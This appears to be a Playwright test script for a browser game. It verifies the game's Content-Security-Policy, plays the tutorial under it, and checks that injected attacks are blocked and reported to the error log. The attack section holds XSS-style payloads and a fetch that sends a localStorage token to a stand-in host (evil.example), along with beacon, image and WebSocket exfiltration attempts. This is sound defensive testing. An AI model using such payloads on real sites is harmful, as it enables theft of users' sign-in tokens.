"""The game's Content-Security-Policy (L1e, 11.11.2026, build.mjs CSP_OF, docs/planer/sikkerhet-skyen.md funn 7): the sign-in's
refresh token lies in localStorage, so a script that got into the page (a feedback with a script in it, a name, a sponsor's text)
must neither run nor be able to send anything away.
1. The policy in the built page: before the first script, default-src 'none', no 'unsafe-inline' and no eval for scripts, a hash
   for every inline script, and it talks only to the page's own origin, the channel's Supabase project, WorkOS and the relay, read
   from src/data/cloud.json. A build for a server (the app, sw.js beside the page) has none of the tests' stand-ins.
2. The whole first trip (as tut.py plays it, without 3D and without its checks), then the account (Innstillinger) and the shop
   (Haill) as a guest with a stand-in for the cloud at the address the policy allows: not one securitypolicyviolation, in the page
   or in its workers (the console).
3. What an attacker would try is stopped: an <img onerror> and a <script> put into the page do not run, a script from another site
   is not fetched, eval does not run, and a fetch, a picture and a beacon to another site do not leave. Each is told to the error
   list (js/errtrap.js: «csp: …» to tm_error), so a breach at a player's shows in admin.
Seen red by taking the policy's <meta> out of dist/index.html: then the inserted scripts run and the fetch leaves.
Prints OK or FEIL per check."""
from _env import GAME_TUT, GAME, BASE, HERE
import asyncio, json, os, re, base64, hashlib, time
from playwright.async_api import async_playwright

ROOT = os.path.dirname(HERE)
DIST = os.path.abspath(os.environ.get('KYST_DIST') or os.path.join(ROOT, 'dist'))


def check(ok, what, extra=''):
    print(('OK  ' if ok else 'FEIL') + ' ' + what + (('  ' + json.dumps(extra, ensure_ascii=False, default=str)[:600]) if extra != '' else ''), flush=True)


# every breach the page sees, and what the console says of one (a worker's breach is only there)
WATCH = """window.__csp = []; addEventListener('securitypolicyviolation', e => window.__csp.push(e.effectiveDirective + ' ' + String(e.blockedURI).slice(0, 80) + ' @' + e.lineNumber));"""


def policy():
    page = open(os.path.join(DIST, 'index.html'), encoding='utf-8').read()
    m = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]*)">', page)
    return page, (m.group(1) if m else ''), (m.start() if m else -1)


def static_checks():
    page, pol, at = policy()
    d = {p.split(' ')[0]: p.split(' ')[1:] for p in pol.split('; ') if p}
    first = page.find('<script')
    check(bool(pol) and 0 <= at < first, 'the page has the policy in a <meta>, before the first script', pol[:80])
    scr = d.get('script-src', [])
    check(d.get('default-src') == ["'none'"] and scr and all(re.fullmatch(r"'sha256-[A-Za-z0-9+/=]{44}'", s) for s in scr),
          "default-src 'none', and scripts run only by their hash: no 'unsafe-inline', no eval, no host", [s for s in scr if not s.startswith("'sha256-")])
    els = [(m.group(1), m.group(2)) for m in re.finditer(r'<script\b([^>]*)>([\s\S]*?)</script>', page)]   # (element by element: a «<script» in a comment inside one is its text)
    inl = [b for t, b in els if t == '']
    miss = [s[:60] for s in inl if "'sha256-" + base64.b64encode(hashlib.sha256(s.encode('utf-8')).digest()).decode() + "'" not in scr]
    other = [t for t, b in els if t and not re.match(r' id="[^"]+" type="application/octet-stream"', t)]
    check(len(inl) >= 5 and not miss and not other, 'every inline script has its hash in the policy, and there is no other kind of script', {'inline': len(inl), 'without': miss, 'other': other[:3]})
    # the hosts are cloud.json's for the build's channel, and nothing else
    raw = json.load(open(os.path.join(ROOT, 'src', 'data', 'cloud.json'), encoding='utf-8')); test = raw.pop('test', {})
    cfg = {**raw, **test} if 'name="dsb-channel" content="test"' in page else raw
    sb = cfg['supabaseUrl'].rstrip('/'); want = {"'self'", sb, 'https://' + (cfg.get('workosApiHostname') or 'api.workos.com')} | {'wss://' + h + '/rt' for h in cfg['hosts']}
    local = {'https://sb.test', 'ws://127.0.0.1:*', 'ws://localhost:*'}
    server = os.path.exists(os.path.join(DIST, 'sw.js')); con = set(d.get('connect-src', []))
    check(con - local == want and (con & local == set() if server else True), 'it talks only to itself, the channel\'s Supabase project, WorkOS and the relay (cloud.json)' + (', with no stand-in for the tests: a build for a server' if server else '; the local build also has the tests\' stand-ins'),
          {'connect-src': sorted(con), 'server': server})
    check(d.get('base-uri') == ["'none'"] and d.get('form-action') == ["'none'"] and set(d.get('img-src', [])) == {"'self'", 'data:', 'blob:', sb} and d.get('worker-src') == ["'self'", 'blob:']
          and 'object-src' not in d and 'frame-src' not in d, 'no <base>, no form, no frame or plug-in; pictures from the page, data:, blob: and the cloud\'s storage; workers from the page and blob:',
          {k: d.get(k) for k in ('base-uri', 'form-action', 'img-src', 'worker-src')})
    return sb


# the state of the guide, as tests/tut.py reads it
STATE = """JSON.stringify((() => { const st = tutOn() ? tutStep() : null, q = st && !$('tutRing').hidden ? tutRect(tutTip(st)).R : null;
  return {id:st ? st.id : null, ring:q && {x:q.x + q.w / 2, y:q.y + q.h / 2}, ok:!$('tipOk').hidden && !$('tip').hidden, okText:$('tipOk').textContent, rod:!!window.jigActive, book:BOOK.isOpen(),
    st:S.boat.status, busy:LEIA_BUSY, sleep:!$('sleep').hidden, wake:!$('sleep').hidden && !$('slSkip').hidden && !$('slSkip').disabled, ack:!$('slAck').hidden}; })())"""
OK_RING = ('deck', 'chip', 'slip', 'goal', 'hud', 'apps', 'vaer', 'salg', 'regler', 'redning', 'legs', 'beh', 'intro', 'n1')


async def first_trip(br, cons):
    ctx = await br.new_context(viewport={'width': 1293, 'height': 830}, has_touch=True); pg = await ctx.new_page(); cdp = await ctx.new_cdp_session(pg)
    pg.set_default_timeout(120000); errs = []
    pg.on('pageerror', lambda e: errs.append(str(e)[:200])); pg.on('dialog', lambda d: asyncio.ensure_future(d.dismiss()))
    pg.on('console', lambda m: cons.append(m.text[:200]) if 'Content Security Policy' in m.text else None)
    await pg.add_init_script(WATCH)

    async def tap(x, y):
        await cdp.send('Input.dispatchTouchEvent', {'type': 'touchStart', 'touchPoints': [{'x': x, 'y': y, 'id': 0}]}); await asyncio.sleep(0.05)
        await cdp.send('Input.dispatchTouchEvent', {'type': 'touchEnd', 'touchPoints': []}); await asyncio.sleep(0.2)

    async def tap_el(sel):
        r = await pg.evaluate("s => { const e = document.querySelector(s); if (!e) return null; const q = e.getBoundingClientRect(); return {x:q.x + q.width / 2, y:q.y + q.height / 2}; }", sel)
        if r: await tap(r['x'], r['y'])

    await pg.goto(GAME_TUT + ',no3d')
    await pg.wait_for_selector('#ltEnv', timeout=90000); await pg.wait_for_timeout(2200); await tap_el('#ltEnv')
    await pg.wait_for_selector('#ltGo.on', timeout=40000); await pg.wait_for_timeout(300); await tap_el('#ltGo')
    await pg.wait_for_selector('#stGo', state='visible', timeout=20000); await pg.wait_for_timeout(300)
    await pg.evaluate("document.querySelector('#startPick .st-it[data-id=vangshamn]').click()"); await tap_el('#stGo')
    await pg.wait_for_selector('#obGo', state='visible', timeout=60000); await pg.wait_for_timeout(400); await tap_el('#obGo'); await pg.wait_for_timeout(1200)
    await pg.evaluate("S.mult = 30; save()")
    seen, t0, stuck, reloaded = [], time.time(), 0, False
    for it in range(1500):
        if time.time() - t0 > 1500: break
        await pg.evaluate("if (!asleep() && S.energy < 60) S.energy = 60")
        s = json.loads(await pg.evaluate(STATE)); sid = s['id']
        if not seen or seen[-1] != sid:
            seen.append(sid); stuck = -1
            if sid == 'fish' and not reloaded:   # one reload on the way: the policy holds for a page that starts from a save too
                reloaded = True; await pg.evaluate("save()"); v = await pg.evaluate("window.__csp"); await pg.reload(); await pg.wait_for_function("typeof SIMREADY !== 'undefined' && SIMREADY === true && typeof tutOn === 'function'", timeout=90000)
                await pg.evaluate("v => { window.__csp = v.concat(window.__csp); }", v); await pg.wait_for_timeout(600); continue
        if sid is None: break
        stuck += 1
        if s['sleep']:
            if s['ack']: await tap_el('#slAck')
            elif s['wake']: await tap_el('#slSkip')
            await pg.wait_for_timeout(500); continue
        if s['book']: await pg.wait_for_timeout(400); await pg.evaluate("BOOK.close()"); await pg.wait_for_timeout(300); continue
        if s['rod'] and sid != 'fish': await pg.evaluate("JIGG.stop(); renderActs()"); continue
        if sid == 'route2' and s['busy']: await pg.wait_for_timeout(300); continue
        if s['ok'] and (not s['ring'] or sid in OK_RING) and not (sid == 'slip' and not s['ring'] and s['okText'].startswith('Skjønner')):
            await tap_el('#tipOk'); await pg.wait_for_timeout(350); continue
        if s['ring']: await tap(s['ring']['x'], s['ring']['y']); await pg.wait_for_timeout(300 if sid != 'route2' else 700); continue
        await pg.wait_for_timeout(400)
    end = await pg.evaluate("({tut:S.tut, land:S.landN || 0, sale:!!S.lastSale, csp:window.__csp})")
    steps = [x for x in seen if x]
    check(end['tut'] == 0 and end['sale'] and 'land' in steps and reloaded, 'the first trip is played to its end under the policy, with a reload on the way (%d s)' % (time.time() - t0), {'steps': steps, 'tut': end['tut']})
    check(end['csp'] == [], 'the first trip: not one breach of the policy', end['csp'][:8])
    check(errs == [], 'the first trip: no page error', errs[:4])
    await ctx.close()


async def guest(br, sb, cons):
    """The account and the shop as a guest, with the cloud's stand-in at the address the policy allows; then what an attacker would try."""
    host = BASE.split('//')[1].split(':')[0]
    cfg = {'hosts': [host, 'localhost'], 'supabaseUrl': sb, 'supabaseAnon': 'anon_test', 'workosClientId': 'client_test'}
    stub = WATCH + """window.DSB_CLOUD = %s;
window.DSB_AUTHKIT = {createClient: async () => ({getUser: () => null, getAccessToken: async () => 'tok_test', signIn: () => { window.__signIn = 1; }, signUp: () => { window.__signUp = 1; }, signOut: () => {}})};""" % json.dumps(cfg)
    ctx = await br.new_context(viewport={'width': 1100, 'height': 800}); pg = await ctx.new_page(); pg.set_default_timeout(120000); errs, calls, out = [], [], []
    pg.on('pageerror', lambda e: errs.append(str(e)[:200]))
    pg.on('console', lambda m: cons.append(m.text[:200]) if 'Content Security Policy' in m.text else None)
    await pg.add_init_script(stub)

    async def cloud(route):
        req = route.request; fn = req.url.split('?')[0].rsplit('/', 1)[-1]
        try: body = json.loads(req.post_data or '{}')
        except Exception: body = {}
        calls.append((fn, body))
        if fn == 'signup': return await route.fulfill(status=200, content_type='application/json', body=json.dumps({'access_token': 'gtok', 'refresh_token': 'grt', 'expires_in': 3600, 'user': {'id': 'g-1'}}))
        if fn == 'shop-checkout': return await route.fulfill(status=200, content_type='application/json', body=json.dumps({'ready': True}))
        r = {'tm_hello': {'consent': None, 'owned': []}, 'save_put2': {'ok': True, 'saved_at': '2026-10-06T10:00:00Z'}}.get(fn, 404 if fn in ('save_put3', 'save_head') else '')
        if r == 404: return await route.fulfill(status=404, content_type='application/json', body='{"code":"PGRST202"}')
        await route.fulfill(status=200, content_type='application/json', body=r if isinstance(r, str) else json.dumps(r))
    await pg.route(sb + '/**', cloud)
    # (anything that leaves for another site would come here; the policy must stop it before)
    async def away(route): out.append(route.request.url[:80]); await route.fulfill(status=200, content_type='text/javascript', body='window.__ran = (window.__ran || []).concat("away");')
    await pg.route('https://evil.example/**', away)
    await pg.goto(GAME); await pg.wait_for_selector('#obGo', state='visible', timeout=90000); await pg.click('#obGo')
    try: await pg.wait_for_selector('#cgNo', timeout=8000); await pg.click('#cgNo')
    except Exception: pass
    await pg.wait_for_function("S.intro === true && CLOUD.on === true", timeout=30000)
    st = await pg.evaluate("""(async () => { S.tut = 0; document.getElementById('modal').hidden = true; const w = ms => new Promise(r => setTimeout(r, ms));
      PHONE.show(true); PHONE.open('innst'); await w(400); const acc = document.getElementById('phView').innerText;
      PHONE.open('haill'); await w(600); const shop = document.getElementById('phView').innerText; PHONE.show(false);
      return {guest:CLOUD.guest === true, on:CLOUD.on, acc:acc.includes('Du spiller som gjest'), shop:shop.length > 40, mode:typeof shopMode === 'function' ? shopMode() : null}; })()""")
    await pg.wait_for_timeout(1500)
    v = await pg.evaluate("window.__csp.splice(0)")
    check(st['guest'] and st['on'] and st['acc'] and st['shop'] and any(c[0] == 'tm_hello' for c in calls) and any(c[0] == 'shop-checkout' for c in calls),
          'as a guest the cloud answers at the address the policy allows, and the account and the shop open', {**st, 'calls': sorted({c[0] for c in calls})[:12]})
    check(v == [], 'the cloud, the account and the shop: not one breach of the policy', v[:8])
    # what an attacker would try, as a text from another player put into the page would
    n0 = len(calls)
    r = await pg.evaluate("""(async () => { const w = ms => new Promise(r => setTimeout(r, ms)), d = document.createElement('div'); document.body.appendChild(d); window.__ran = [];
      d.innerHTML = '<img src="data:image/gif;base64,AA" onerror="window.__ran.push(\\'onerror\\')"><a id="xa" href="javascript:window.__ran.push(\\'href\\')">x</a>';
      const s1 = document.createElement('script'); s1.textContent = "window.__ran.push('inline')"; document.body.appendChild(s1);
      const s2 = document.createElement('script'); s2.src = 'https://evil.example/x.js'; document.body.appendChild(s2);
      try { document.getElementById('xa').click(); } catch (e){}
      await w(50);   // (eval called straight from the debugger's evaluate is let through by the browser; from here on the page is on its own)
      let ev = 'ran'; try { (0, eval)("window.__ran.push('eval')"); } catch (e){ ev = e.name; }
      let fn = 'ran'; try { new Function("window.__ran.push('function')")(); } catch (e){ fn = e.name; }
      let fe = 'left'; try { await fetch('https://evil.example/steal?t=' + encodeURIComponent(localStorage.getItem('dsb_guest') || 'x'), {mode:'no-cors'}); } catch (e){ fe = 'stopped'; }
      new Image().src = 'https://evil.example/p.gif?t=1'; let be = null; try { be = navigator.sendBeacon('https://evil.example/b', 'x'); } catch (e){ be = 'threw'; }
      let wsr = 'open'; try { const ws = new WebSocket('wss://evil.example/s'); await new Promise(r => { ws.onerror = () => { wsr = 'stopped'; r(); }; ws.onopen = r; setTimeout(r, 1500); }); } catch (e){ wsr = 'stopped'; }
      await w(1200); d.remove(); return {ran:window.__ran, ev, fn, fe, be, wsr, csp:window.__csp.splice(0)}; })()""")
    dirs = sorted({x.split(' ')[0] for x in r['csp']})
    check(r['ran'] == [] and r['ev'] == 'EvalError' and r['fn'] == 'EvalError', 'an <img onerror>, a javascript: link, an inserted <script>, a script from another site, eval and new Function do not run', {k: r[k] for k in ('ran', 'ev', 'fn')})
    check(r['fe'] == 'stopped' and r['wsr'] == 'stopped' and out == [], 'a fetch, a picture, a beacon, a script and a WebSocket to another site do not leave the page', {'fetch': r['fe'], 'ws': r['wsr'], 'beacon': r['be'], 'left': out})
    check(all(any(x.startswith(k) for x in r['csp']) for k in ('script-src-attr', 'script-src-elem', 'script-src ', 'connect-src', 'img-src')), 'each is a breach the page is told of (securitypolicyviolation)', dirs)
    await pg.wait_for_timeout(1500)
    told = [c[1].get('msg', '') for c in calls[n0:] if c[0] == 'tm_error' and str(c[1].get('msg', '')).startswith('csp: ')]
    check(any('csp: connect-src https://evil.example/steal' == m for m in told) and any(m.startswith('csp: script-src-elem') for m in told) and not any('?' in m for m in told),
          'the breaches go to the error list (tm_error, «csp: directive address» without the query), so one at a player\'s shows in admin', told[:6])
    check(errs == [], 'as a guest: no page error', errs[:4])
    await ctx.close()


async def main():
    sb = static_checks(); cons = []
    async with async_playwright() as p:
        br = await p.chromium.launch(args=['--disable-gpu-compositing', '--use-angle=swiftshader', '--enable-unsafe-swiftshader', '--ignore-gpu-blocklist'])
        await guest(br, sb, cons)
        n = len(cons)   # (the attacker's part writes its breaches to the console, as it must)
        if os.environ.get('KYST_CSP_NOTRIP') != '1':
            await first_trip(br, cons)
            check(len(cons) == n, 'and none in the workers during the first trip (the console)', cons[n:n + 4])
        await br.close()

asyncio.run(main())
